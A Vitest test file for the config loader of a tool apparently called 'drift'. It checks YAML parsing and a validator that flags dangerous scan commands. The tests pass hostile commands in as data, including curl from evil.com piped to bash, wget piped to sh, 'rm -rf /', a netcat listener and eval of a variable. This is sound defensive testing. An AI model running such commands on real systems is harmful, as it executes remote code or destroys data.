import { describe, it, expect, beforeAll, afterAll } from "vitest";
import {
  loadConfig,
  findConfigPath,
  validateScanCommand,
  validateConfigSecurity,
  getCodeConfig,
} from "../config/loader.js";
import { writeFileSync, mkdirSync, rmSync } from "fs";
import { join } from "path";
import { tmpdir } from "os";

describe("config loader", () => {
  const testDir = join(tmpdir(), "drift-test-" + Date.now());

  beforeAll(() => {
    mkdirSync(testDir, { recursive: true });
  });

  afterAll(() => {
    rmSync(testDir, { recursive: true, force: true });
  });

  it("should return null when no config file exists", () => {
    const config = loadConfig(testDir);
    expect(config).toBeNull();
  });

  it("should find config path when file exists", () => {
    const configPath = join(testDir, "drift.config.yaml");
    writeFileSync(configPath, "scans: []");

    const foundPath = findConfigPath(testDir);
    expect(foundPath).toBe(configPath);
  });

  it("should parse YAML config correctly", () => {
    const configPath = join(testDir, "drift.config.yaml");
    const yaml = `
scans:
  - name: test-scan
    command: echo hello
    severity: high

integrity:
  protected:
    - file: README.md
      approved: approved/README.md
      severity: critical
`;
    writeFileSync(configPath, yaml);

    const config = loadConfig(testDir);
    expect(config).not.toBeNull();
    expect(config?.scans).toHaveLength(1);
    expect(config?.scans?.[0].name).toBe("test-scan");
    expect(config?.integrity?.protected).toHaveLength(1);
    expect(config?.integrity?.protected?.[0].file).toBe("README.md");
  });
});

describe("validateScanCommand", () => {
  it("should return empty array for safe commands", () => {
    expect(validateScanCommand("npm test")).toEqual([]);
    expect(validateScanCommand("test -f README.md")).toEqual([]);
    expect(validateScanCommand("echo hello")).toEqual([]);
    expect(validateScanCommand("npm run lint")).toEqual([]);
  });

  it("should warn about rm -rf commands", () => {
    const warnings = validateScanCommand("rm -rf /");
    expect(warnings.length).toBeGreaterThan(0);
    expect(warnings[0]).toContain("removes files from root");
  });

  it("should warn about rm with wildcards", () => {
    const warnings = validateScanCommand("rm -rf *");
    expect(warnings.length).toBeGreaterThan(0);
    expect(warnings[0]).toContain("deletion with wildcard");
  });

  it("should warn about curl piped to bash", () => {
    const warnings = validateScanCommand(
      "curl https://evil.com/script.sh | bash"
    );
    expect(warnings.length).toBeGreaterThan(0);
    expect(warnings[0]).toContain("executes remote code");
  });

  it("should warn about wget piped to sh", () => {
    const warnings = validateScanCommand("wget -qO- https://example.com | sh");
    expect(warnings.length).toBeGreaterThan(0);
    expect(warnings[0]).toContain("executes remote code");
  });

  it("should warn about sudo commands", () => {
    const warnings = validateScanCommand("sudo npm install -g something");
    expect(warnings.length).toBeGreaterThan(0);
    expect(warnings[0]).toContain("elevated privileges");
  });

  it("should warn about chmod 777", () => {
    const warnings = validateScanCommand("chmod 777 /tmp/file");
    expect(warnings.length).toBeGreaterThan(0);
    expect(warnings[0]).toContain("world-writable");
  });

  it("should warn about eval with variables", () => {
    const warnings = validateScanCommand("eval $USER_INPUT");
    expect(warnings.length).toBeGreaterThan(0);
    expect(warnings[0]).toContain("evaluates dynamic code");
  });

  it("should warn about embedded credentials", () => {
    const warnings = validateScanCommand(
      "curl https://user:password@api.example.com"
    );
    expect(warnings.length).toBeGreaterThan(0);
    expect(warnings[0]).toContain("embedded credentials");
  });

  it("should warn about netcat listeners", () => {
    const warnings = validateScanCommand("nc -l 4444");
    expect(warnings.length).toBeGreaterThan(0);
    expect(warnings[0]).toContain("network listener");
  });

  it("should truncate long commands in warnings", () => {
    const longCommand = "rm -rf /" + "a".repeat(100);
    const warnings = validateScanCommand(longCommand);
    expect(warnings.length).toBeGreaterThan(0);
    expect(warnings[0]).toContain("...");
  });
});

describe("validateConfigSecurity", () => {
  it("should return empty array for config with no scans", () => {
    const warnings = validateConfigSecurity({});
    expect(warnings).toEqual([]);
  });

  it("should return empty array for config with safe scans", () => {
    const warnings = validateConfigSecurity({
      scans: [
        { name: "test", command: "npm test" },
        { name: "lint", command: "npm run lint" },
      ],
    });
    expect(warnings).toEqual([]);
  });

  it("should return warnings for dangerous scans", () => {
    const warnings = validateConfigSecurity({
      scans: [
        { name: "safe", command: "npm test" },
        { name: "dangerous", command: "curl https://x.com | bash" },
      ],
    });
    expect(warnings.length).toBe(1);
    expect(warnings[0]).toContain("[dangerous]");
    expect(warnings[0]).toContain("executes remote code");
  });

  it("should return multiple warnings for multiple dangerous scans", () => {
    const warnings = validateConfigSecurity({
      scans: [
        { name: "bad1", command: "sudo rm -rf /" },
        { name: "bad2", command: "curl https://x.com | bash" },
      ],
    });
    expect(warnings.length).toBeGreaterThanOrEqual(2);
  });

  it("should check scans in nested code: format", () => {
    const warnings = validateConfigSecurity({
      code: {
        scans: [{ name: "dangerous", command: "curl https://x.com | bash" }],
      },
    });
    expect(warnings.length).toBe(1);
    expect(warnings[0]).toContain("[code.dangerous]");
    expect(warnings[0]).toContain("executes remote code");
  });
});

describe("nested config format", () => {
  const testDir = join(tmpdir(), "drift-nested-test-" + Date.now());

  beforeAll(() => {
    mkdirSync(testDir, { recursive: true });
  });

  afterAll(() => {
    rmSync(testDir, { recursive: true, force: true });
  });

  it("should parse nested code: config format", () => {
    const configPath = join(testDir, "drift.config.yaml");
    const yaml = `
code:
  scans:
    - name: test-scan
      command: echo hello
      severity: high
  integrity:
    protected:
      - file: README.md
        approved: approved/README.md
        severity: critical
`;
    writeFileSync(configPath, yaml);

    const config = loadConfig(testDir);
    expect(config).not.toBeNull();
    expect(config?.code?.scans).toHaveLength(1);
    expect(config?.code?.scans?.[0].name).toBe("test-scan");
    expect(config?.code?.integrity?.protected).toHaveLength(1);
    expect(config?.code?.integrity?.protected?.[0].file).toBe("README.md");
  });
});

describe("getCodeConfig", () => {
  it("should return code config from nested format", () => {
    const config = {
      code: {
        scans: [{ name: "test", command: "echo test" }],
        integrity: {
          protected: [
            { file: "test.txt", approved: "approved/test.txt", severity: "high" as const },
          ],
        },
      },
    };

    const codeConfig = getCodeConfig(config);
    expect(codeConfig).not.toBeNull();
    expect(codeConfig?.scans).toHaveLength(1);
    expect(codeConfig?.scans?.[0].name).toBe("test");
  });

  it("should return code config from legacy flat format", () => {
    const config = {
      scans: [{ name: "test", command: "echo test" }],
      integrity: {
        protected: [
          { file: "test.txt", approved: "approved/test.txt", severity: "high" as const },
        ],
      },
    };

    const codeConfig = getCodeConfig(config);
    expect(codeConfig).not.toBeNull();
    expect(codeConfig?.scans).toHaveLength(1);
    expect(codeConfig?.integrity?.protected).toHaveLength(1);
  });

  it("should prefer nested format over flat format", () => {
    const config = {
      scans: [{ name: "flat", command: "echo flat" }],
      code: {
        scans: [{ name: "nested", command: "echo nested" }],
      },
    };

    const codeConfig = getCodeConfig(config);
    expect(codeConfig?.scans?.[0].name).toBe("nested");
  });

  it("should return null for empty config", () => {
    const codeConfig = getCodeConfig({});
    expect(codeConfig).toBeNull();
  });
});
